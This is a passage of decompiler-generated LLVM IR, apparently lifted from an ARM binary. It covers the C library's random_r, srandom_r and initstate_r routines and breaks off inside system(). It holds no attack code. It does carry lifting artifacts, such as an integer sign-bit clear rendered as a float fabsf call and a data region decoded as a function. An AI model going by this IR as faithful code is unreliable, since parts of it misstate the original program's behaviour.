  %v1_1677c = load i32, i32* %r5.global-to-local, align 4
  %v4_1677c = mul i32 %v1_1677c, 4
  %v5_1677c = add i32 %v4_1677c, %v0_1677c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16784 = load i32, i32* %r4.global-to-local, align 4
  %v2_16784 = add i32 %v1_16784, 24
  %v3_16784 = inttoptr i32 %v2_16784 to i32*
  store i32 %v5_1677c, i32* %v3_16784, align 4
  %v0_16788 = load i32, i32* %r6.global-to-local, align 4
  %v1_16788 = load i32, i32* %r4.global-to-local, align 4
  %v2_16788 = add i32 %v1_16788, 8
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  store i32 %v0_16788, i32* %v3_16788, align 4
  %v2_1678c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1678c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_16790:                               ; preds = %bb
  %v0_16790 = call i32 @__errno_location()
  %v2_16798 = inttoptr i32 %v0_16790 to i32*
  store i32 22, i32* %v2_16798, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_167a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_167a0, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_16724, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1677c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_167a8 = add i32 %tmp, 12
  %v2_167a8 = inttoptr i32 %v1_167a8 to i32*
  %v3_167a8 = load i32, i32* %v2_167a8, align 4
  store i32 %v3_167a8, i32* %r3.global-to-local, align 4
  %v2_167ac = icmp eq i32 %v3_167a8, 0
  %v3_167b0 = load i32, i32* @r4, align 4
  store i32 %v3_167b0, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_167bc = add i32 %tmp, 8
  %v2_167bc = inttoptr i32 %v1_167bc to i32*
  %v3_167bc = load i32, i32* %v2_167bc, align 4
  store i32 %v3_167bc, i32* %lr.global-to-local, align 4
  br i1 %v2_167ac, label %dec_label_pc_167c4, label %dec_label_pc_167e8

dec_label_pc_167c4:                               ; preds = %entry
  %v1_167c4 = inttoptr i32 %v3_167bc to i32*
  %v2_167c4 = load i32, i32* %v1_167c4, align 4
  store i32 %v2_167c4, i32* %r2.global-to-local, align 4
  %v2_167cc = mul i32 %v2_167c4, 1103515245
  %v1_167d4 = add i32 %v2_167cc, 12345
  %tmp10 = bitcast i32 %v1_167d4 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_167d8 = bitcast float %tmp11 to i32
  store i32 %v1_167d8, i32* %r3.global-to-local, align 4
  store i32 %v1_167d8, i32* %v1_167c4, align 4
  %v0_167e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_167e0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_167e0, i32* %v2_167e0, align 4
  br label %dec_label_pc_1682c

dec_label_pc_167e8:                               ; preds = %entry
  %v2_167e8 = load i32, i32* %arg1, align 4
  store i32 %v2_167e8, i32* %r2.global-to-local, align 4
  %v1_167ec = add i32 %tmp, 4
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %v2_167ec, align 4
  store i32 %v3_167ec, i32* %r0.global-to-local, align 4
  %v1_167f0 = inttoptr i32 %v2_167e8 to i32*
  %v2_167f0 = load i32, i32* %v1_167f0, align 4
  store i32 %v2_167f0, i32* %r3.global-to-local, align 4
  %v1_167f4 = inttoptr i32 %v3_167ec to i32*
  %v2_167f4 = load i32, i32* %v1_167f4, align 4
  %v4_167f4 = add i32 %v3_167ec, 4
  store i32 %v4_167f4, i32* %r0.global-to-local, align 4
  %v2_167f8 = add i32 %v2_167f4, %v2_167f0
  store i32 %v2_167f8, i32* %r3.global-to-local, align 4
  store i32 %v2_167f8, i32* %v1_167f0, align 4
  %v3_167fc = load i32, i32* %r2.global-to-local, align 4
  %v4_167fc = add i32 %v3_167fc, 4
  store i32 %v4_167fc, i32* %r2.global-to-local, align 4
  %v0_16800 = load i32, i32* %ip.global-to-local, align 4
  %v1_16800 = add i32 %v0_16800, 24
  %v2_16800 = inttoptr i32 %v1_16800 to i32*
  %v3_16800 = load i32, i32* %v2_16800, align 4
  store i32 %v3_16800, i32* %r4.global-to-local, align 4
  %v0_16804 = load i32, i32* %r3.global-to-local, align 4
  %v3_16804 = udiv i32 %v0_16804, 2
  store i32 %v3_16804, i32* %r3.global-to-local, align 4
  %v3_16808 = icmp ult i32 %v4_167fc, %v3_16800
  %v1_1680c = load i32, i32* %r5.global-to-local, align 4
  %v2_1680c = inttoptr i32 %v1_1680c to i32*
  store i32 %v3_16804, i32* %v2_1680c, align 4
  br i1 %v3_16808, label %dec_label_pc_1681c, label %bb

bb:                                               ; preds = %dec_label_pc_167e8
  %v1_16810 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16810, i32* %r2.global-to-local, align 4
  %v0_16814 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16814, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_1681c:                               ; preds = %dec_label_pc_167e8
  %v0_168141 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_168141, i32* %r3.global-to-local, align 4
  %v1_1681c = load i32, i32* %r4.global-to-local, align 4
  %v3_1681c = icmp ult i32 %v0_168141, %v1_1681c
  br i1 %v3_1681c, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_1681c
  store i32 %v0_168141, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_1681c
  %v1_16824 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16824, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_16828 = load i32, i32* %ip.global-to-local, align 4
  %v1_16828 = inttoptr i32 %v0_16828 to i32*
  %v2_16828 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_16828, i32* %v1_16828, align 4
  %v3_16828 = add i32 %v0_16828, 4
  %v4_16828 = inttoptr i32 %v3_16828 to i32*
  %v5_16828 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_16828, i32* %v4_16828, align 4
  br label %dec_label_pc_1682c

dec_label_pc_1682c:                               ; preds = %dec_label_pc_167c4, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16830 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16830, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_168141, { 1, 0, 2 }
  uselistorder i32 %v3_16804, { 1, 0 }
  uselistorder i32 %v1_167d8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1682c, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16838 = load i32, i32* @r4, align 4
  store i32 %v3_16838, i32* %stack_var_-32, align 4
  %v6_16838 = load i32, i32* @r5, align 4
  %v1_1683c = add i32 %tmp, 12
  %v2_1683c = inttoptr i32 %v1_1683c to i32*
  %v3_1683c = load i32, i32* %v2_1683c, align 4
  %v2_16844 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_1683c, 4
  br i1 %tmp29, label %.dec_label_pc_168f0_crit_edge, label %dec_label_pc_16854

.dec_label_pc_168f0_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_168f0

dec_label_pc_16854:                               ; preds = %entry
  %v0_16854 = load i32, i32* @r0, align 4
  %v2_16854 = icmp eq i32 %v0_16854, 0
  %v1_16858 = add i32 %tmp, 8
  %v2_16858 = inttoptr i32 %v1_16858 to i32*
  %v3_16858 = load i32, i32* %v2_16858, align 4
  store i32 %v3_16858, i32* %r7.global-to-local, align 4
  br i1 %v2_16854, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16854
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16854, %bb
  %v0_16864 = phi i32 [ %v0_16854, %dec_label_pc_16854 ], [ 1, %bb ]
  %v2_16860 = icmp eq i32 %v3_1683c, 0
  %v2_16864 = inttoptr i32 %v3_16858 to i32*
  store i32 %v0_16864, i32* %v2_16864, align 4
  br i1 %v2_16860, label %dec_label_pc_168ec, label %dec_label_pc_1686c

dec_label_pc_1686c:                               ; preds = %bb21
  %v1_1686c = add i32 %tmp, 16
  %v2_1686c = inttoptr i32 %v1_1686c to i32*
  %v3_1686c = load i32, i32* %v2_1686c, align 4
  store i32 %v3_1686c, i32* %sb.global-to-local, align 4
  %v0_16870 = load i32, i32* @r0, align 4
  %v0_16874 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16874, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_168bc23 = icmp sgt i32 %v3_1686c, 1
  br i1 %v5_168bc23, label %dec_label_pc_16880, label %dec_label_pc_168c0

dec_label_pc_16880:                               ; preds = %dec_label_pc_1686c, %dec_label_pc_16880
  %v0_1689025 = phi i32 [ %v0_168b0.pre, %dec_label_pc_16880 ], [ %v0_16870, %dec_label_pc_1686c ]
  %v1_168a824 = phi i32 [ %v5_168a8, %dec_label_pc_16880 ], [ %v0_16874, %dec_label_pc_1686c ]
  %v2_16880 = srem i32 %v0_1689025, 127773
  %v2_1688c = mul i32 %v2_16880, 16807
  %v2_16894 = sdiv i32 %v0_1689025, 127773
  %tmp30 = mul nsw i32 %v2_16894, -2836
  %v2_168a0 = add i32 %v2_1688c, %tmp30
  %v8_168a0 = icmp slt i32 %v2_168a0, 0
  %v2_168a4 = add i32 %v2_168a0, 2147483647
  %v2_168a4.v2_168a0 = select i1 %v8_168a0, i32 %v2_168a4, i32 %v2_168a0
  store i32 %v2_168a4.v2_168a0, i32* @r5, align 4
  %v2_168a8 = add i32 %v1_168a824, 4
  %v3_168a8 = inttoptr i32 %v2_168a8 to i32*
  store i32 %v2_168a4.v2_168a0, i32* %v3_168a8, align 4
  %v4_168a8 = load i32, i32* %sl.global-to-local, align 4
  %v5_168a8 = add i32 %v4_168a8, 4
  store i32 %v5_168a8, i32* %sl.global-to-local, align 4
  %v0_168ac.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_168ac.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_168b0.pre = load i32, i32* @r5, align 4
  %v1_168b8 = add i32 %v0_168ac.pre, 1
  store i32 %v1_168b8, i32* %r8.global-to-local, align 4
  %v5_168bc = icmp slt i32 %v0_168ac.pre, %v1_168ac.pre
  br i1 %v5_168bc, label %dec_label_pc_16880, label %dec_label_pc_168ac.dec_label_pc_168c0_crit_edge

dec_label_pc_168ac.dec_label_pc_168c0_crit_edge:  ; preds = %dec_label_pc_16880
  %v0_168cc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168ac.dec_label_pc_168c0_crit_edge, %dec_label_pc_1686c
  %v0_168cc = phi i32 [ %v0_168cc.pre, %dec_label_pc_168ac.dec_label_pc_168c0_crit_edge ], [ %v0_16874, %dec_label_pc_1686c ]
  %v0_168c4.lcssa = phi i32 [ %v1_168ac.pre, %dec_label_pc_168ac.dec_label_pc_168c0_crit_edge ], [ %v3_1686c, %dec_label_pc_1686c ]
  %v2_168c4 = mul i32 %v0_168c4.lcssa, 10
  store i32 %v2_168c4, i32* @r4, align 4
  %v0_168c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_168c8 = add i32 %v0_168c8, 20
  %v2_168c8 = inttoptr i32 %v1_168c8 to i32*
  %v3_168c8 = load i32, i32* %v2_168c8, align 4
  %v4_168cc = mul i32 %v3_168c8, 4
  %v5_168cc = add i32 %v0_168cc, %v4_168cc
  %v1_168d0 = inttoptr i32 %v0_168c8 to i32*
  store i32 %v5_168cc, i32* %v1_168d0, align 4
  %v3_168d0 = add i32 %v0_168c8, 4
  %v4_168d0 = inttoptr i32 %v3_168d0 to i32*
  %v5_168d0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_168d0, i32* %v4_168d0, align 4
  br label %dec_label_pc_168dc

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168dc
  %v0_168e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_168d8 = inttoptr i32 %v0_168e0 to i32*
  %v3_168d8 = call i32 @__GI_random_r(i32* %v2_168d8, i32 %v2_16844)
  br label %dec_label_pc_168dc

dec_label_pc_168dc:                               ; preds = %dec_label_pc_168c0, %dec_label_pc_168d8
  %v0_168dc = load i32, i32* @r4, align 4
  %v1_168dc = add i32 %v0_168dc, -1
  store i32 %v1_168dc, i32* @r4, align 4
  %v6_168dc = icmp slt i32 %v1_168dc, 0
  br i1 %v6_168dc, label %dec_label_pc_168ec, label %dec_label_pc_168d8

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168dc, %bb21
  %v2_168f4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_168f0

dec_label_pc_168f0:                               ; preds = %.dec_label_pc_168f0_crit_edge, %dec_label_pc_168ec
  %v2_168f4 = phi i32 [ %v3_16838, %.dec_label_pc_168f0_crit_edge ], [ %v2_168f4.pre, %dec_label_pc_168ec ]
  %v26_168f4 = phi i32 [ -1, %.dec_label_pc_168f0_crit_edge ], [ 0, %dec_label_pc_168ec ]
  store i32 %v2_168f4, i32* @r4, align 4
  store i32 %v6_16838, i32* @r5, align 4
  ret i32 %v26_168f4

; uselistorder directives
  uselistorder i32 %v1_168dc, { 1, 0 }
  uselistorder i32 %v0_168c8, { 1, 0, 2 }
  uselistorder i32 %v0_168ac.pre, { 1, 0 }
  uselistorder i32 %v5_168a8, { 1, 0 }
  uselistorder i32 %v2_168a0, { 2, 1, 0 }
  uselistorder i32 %v0_1689025, { 1, 0 }
  uselistorder i32 %v0_16874, { 1, 0, 2 }
  uselistorder i32 %v3_1686c, { 1, 0, 2 }
  uselistorder i32 %v3_1683c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_168f0, { 1, 0 }
  uselistorder label %dec_label_pc_168dc, { 1, 0 }
  uselistorder label %dec_label_pc_16880, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_168f8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_168f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_168f8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_168f8
  %v2_168f8 = load i32, i32* @r7, align 4
  %v5_168f8 = udiv i32 %v2_168f8, 8
  %v6_168f8 = and i32 %v5_168f8, %arg1
  store i32 %v6_168f8, i32* %r4.global-to-local, align 4
  %v2_168fc = load i32, i32* @sp, align 4
  %v8_168fc = shl i32 %v2_168fc, %arg3
  %v9_168fc = and i32 %v8_168fc, %arg2
  call void @__pseudo_branch(i32 %v9_168fc)
  %v0_16900.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_16900 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_16900.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_16900 = load i32, i32* %r4.global-to-local, align 4
  %v3_16900 = load i32, i32* @fp, align 4
  %v8_16900 = shl i32 %v2_16900, %v3_16900
  %v9_16900 = and i32 %v8_16900, %v1_16900
  store i32 %v9_16900, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_168f8, %bb
  %v10_16900 = phi i32 [ %arg1, %dec_label_pc_168f8 ], [ %v9_16900, %bb ], [ %v1_16900, %.thread ]
  ret i32 %v10_16900

; uselistorder directives
  uselistorder i32 %v1_16900, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16908 = load i32, i32* @r4, align 4
  store i32 %v3_16908, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg3, 128
  br i1 %tmp28, label %dec_label_pc_16928, label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %entry
  %v2_16918 = icmp ugt i32 %arg3, 254
  %v7_16918 = icmp eq i32 %arg3, 255
  %v2_1691c = xor i1 %v7_16918, true
  %v3_1691c = and i1 %v2_16918, %v2_1691c
  br i1 %v3_1691c, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_16918
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16918, %bb
  %v1_169507 = phi i32 [ %v3_16908, %dec_label_pc_16918 ], [ 4, %bb ]
  %v2_16920 = xor i1 %v2_16918, true
  %v3_16920 = or i1 %v7_16918, %v2_16920
  br i1 %v3_16920, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_16928:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg3, 31
  br i1 %tmp29, label %dec_label_pc_16940, label %dec_label_pc_16930

dec_label_pc_16930:                               ; preds = %dec_label_pc_16928
  %tmp30 = icmp ugt i32 %arg3, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_169ac

.thread10:                                        ; preds = %dec_label_pc_16930
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_16940:                               ; preds = %dec_label_pc_16928
  %v2_16940 = icmp ugt i32 %arg3, 62
  %v7_16940 = icmp eq i32 %arg3, 63
  %v2_16944 = xor i1 %v7_16940, true
  %v3_16944 = and i1 %v2_16940, %v2_16944
  br i1 %v3_16944, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_16940
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_16940, %bb22
  %v1_169506 = phi i32 [ %v3_16908, %dec_label_pc_16940 ], [ 2, %bb22 ]
  %v2_16948 = xor i1 %v2_16940, true
  %v3_16948 = or i1 %v7_16940, %v2_16948
  br i1 %v3_16948, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_16958 = phi i32 [ 3, %bb21 ], [ %v1_169507, %bb20 ], [ %v1_169506, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1de60.1043 to i32), i32* %r2.global-to-local, align 4
  %v4_16950 = mul i32 %v1_16958, 4
  %v5_16950 = add i32 %v4_16950, ptrtoint (i32* @global_var_1de60.1043 to i32)
  store i32 %v5_16950, i32* %r3.global-to-local, align 4
  %v1_16954 = add i32 %v4_16950, add (i32 ptrtoint (i32* @global_var_1de60.1043 to i32), i32 20)
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  store i32 %v3_16954, i32* %r1.global-to-local, align 4
  %v6_16958 = inttoptr i32 %v5_16950 to i32*
  %v7_16958 = load i32, i32* %v6_16958, align 4
  store i32 %v7_16958, i32* %r2.global-to-local, align 4
  %v1_1695c = add i32 %tmp, 4
  store i32 %v1_1695c, i32* @r6, align 4
  %v4_16960 = mul i32 %v3_16954, 4
  %v5_16960 = add i32 %v4_16960, %v1_1695c
  store i32 %v5_16960, i32* %r3.global-to-local, align 4
  %v2_16964 = add i32 %arg4, 24
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v5_16960, i32* %v3_16964, align 4
  %v0_16968 = load i32, i32* %r2.global-to-local, align 4
  %v1_16968 = load i32, i32* @r5, align 4
  %v2_16968 = add i32 %v1_16968, 20
  %v3_16968 = inttoptr i32 %v2_16968 to i32*
  store i32 %v0_16968, i32* %v3_16968, align 4
  %v0_1696c = load i32, i32* %r1.global-to-local, align 4
  %v1_1696c = load i32, i32* @r5, align 4
  %v2_1696c = add i32 %v1_1696c, 16
  %v3_1696c = inttoptr i32 %v2_1696c to i32*
  store i32 %v0_1696c, i32* %v3_1696c, align 4
  %v0_16970 = load i32, i32* @r4, align 4
  %v1_16970 = load i32, i32* @r5, align 4
  %v2_16970 = add i32 %v1_16970, 12
  %v3_16970 = inttoptr i32 %v2_16970 to i32*
  store i32 %v0_16970, i32* %v3_16970, align 4
  %v0_16974 = load i32, i32* @r6, align 4
  %v1_16974 = load i32, i32* @r5, align 4
  %v2_16974 = add i32 %v1_16974, 8
  %v3_16974 = inttoptr i32 %v2_16974 to i32*
  store i32 %v0_16974, i32* %v3_16974, align 4
  %v0_16978 = load i32, i32* @r5, align 4
  store i32 %v0_16978, i32* %r1.global-to-local, align 4
  %v2_1697c = inttoptr i32 %arg1 to i32*
  %v3_1697c = call i32 @srandom_r(i32* %v2_1697c, i32 %v0_16978)
  store i32 %v3_1697c, i32* %r0.global-to-local, align 4
  %v0_16980 = load i32, i32* @r4, align 4
  %v2_16980 = icmp eq i32 %v0_16980, 0
  br i1 %v2_16980, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1699c12 = load i32, i32* @r7, align 4
  %v2_1699c13 = inttoptr i32 %v1_1699c12 to i32*
  store i32 0, i32* %v2_1699c13, align 4
  %v1_169a0 = load i32, i32* @r4, align 4
  store i32 %v1_169a0, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_16984 = load i32, i32* @r5, align 4
  %v2_16984 = add i32 %v1_16984, 4
  %v3_16984 = inttoptr i32 %v2_16984 to i32*
  %v4_16984 = load i32, i32* %v3_16984, align 4
  %v1_16988 = load i32, i32* @r6, align 4
  %v3_16988 = sub i32 %v4_16984, %v1_16988
  %v4_1698c = sdiv i32 %v3_16988, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_16994 = mul i32 %v4_1698c, 5
  %v5_16994 = add i32 %v4_16994, %v0_16980
  store i32 %v5_16994, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1699c = load i32, i32* @r7, align 4
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  store i32 0, i32* %v2_1699c, align 4
  %v1_169a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_169a4 = load i32, i32* @r7, align 4
  %v3_169a4 = inttoptr i32 %v2_169a4 to i32*
  store i32 %v1_169a4, i32* %v3_169a4, align 4
  %v17_169a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_169a8 = phi i32 [ %v1_169a0, %bb26 ], [ %v17_169a8.pre, %.thread4 ]
  %v2_169a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_169a8, i32* %r4.global-to-local, align 4
  ret i32 %v17_169a8

dec_label_pc_169ac:                               ; preds = %dec_label_pc_16930
  %v0_169ac = call i32 @__errno_location()
  store i32 %v0_169ac, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_169b4 = inttoptr i32 %v0_169ac to i32*
  store i32 22, i32* %v2_169b4, align 4
  %v0_169b8 = call i32 @__errno_location()
  %v0_169bc = load i32, i32* %r4.global-to-local, align 4
  %v2_169bc = inttoptr i32 %v0_169b8 to i32*
  store i32 %v0_169bc, i32* %v2_169bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_169c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_169c4, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_16940, { 1, 0 }
  uselistorder i1 %v7_16918, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1de60.1043 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1de60.1043 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg3, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_169cc = load i32, i32* @r4, align 4
  %v0_169d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_169d0 = icmp eq i32 %v0_169d0, 0
  br i1 %v2_169d0, label %bb, label %dec_label_pc_169e4

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16af0

dec_label_pc_169e4:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_169ec = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_169fc = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16a0c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_16a0c, i32* %r0.global-to-local, align 4
  %v0_16a14 = call i32 @__vfork()
  store i32 %v0_16a14, i32* %r0.global-to-local, align 4
  store i32 %v0_16a14, i32* @r4, align 4
  %v1_16a18 = icmp slt i32 %v0_16a14, 0
  br i1 %v1_16a18, label %dec_label_pc_16a20, label %dec_label_pc_16a4c

dec_label_pc_16a20:                               ; preds = %dec_label_pc_169e4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_16a28 = call i32 @__bsd_signal(i32 3, i32 %v2_169ec)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16a34 = call i32 @__bsd_signal(i32 2, i32 %v2_169fc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16a40 = call i32 @__bsd_signal(i32 17, i32 %v2_16a0c)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16af0

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_169e4
  %v2_16a18 = icmp eq i32 %v0_16a14, 0
  br i1 %v2_16a18, label %dec_label_pc_16a50, label %dec_label_pc_16a94

dec_label_pc_16a50:                               ; preds = %dec_label_pc_16a4c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_16a58 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_16a5c = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16a64 = call i32 @__bsd_signal(i32 2, i32 %v0_16a5c)
  %v0_16a68 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16a70 = call i32 @__bsd_signal(i32 17, i32 %v0_16a68)
  store i32 ptrtoint ([8 x i8]* @global_var_1de88.1050 to i32), i32* @r0, align 4
  %v0_16a84 = load i32, i32* @r4, align 4
